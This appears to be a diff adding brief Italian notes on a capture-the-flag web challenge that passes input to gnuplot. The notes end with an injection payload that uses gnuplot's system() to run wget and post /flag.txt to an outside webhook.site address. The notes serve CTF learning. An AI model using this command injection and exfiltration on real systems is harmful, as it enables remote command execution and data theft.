@@ -1,0 +1,6 @@
+- Provando a giocare con l'applicazione ho notato che il nome del file che viene generato si chiama pyGnuPlot --> è l'unica informazione utilie per la risoluzione della challeng
+- L'informazione chiave successiva non ho capito come reperirla
+	- Ho trovato un write up con la soluzione, senza non ci sarei mai arrivato
+	- http://gnuplot.info/docs/loc2005.html 
+	- gnuplot accetta l'esecuzone di comandi tramite system
+	- da qui l'inj è facile `system("wget --post-file /flag.txt https://webhook.site/304b9e35-9408-47f6-a57e-a19ca61a9a0f")`
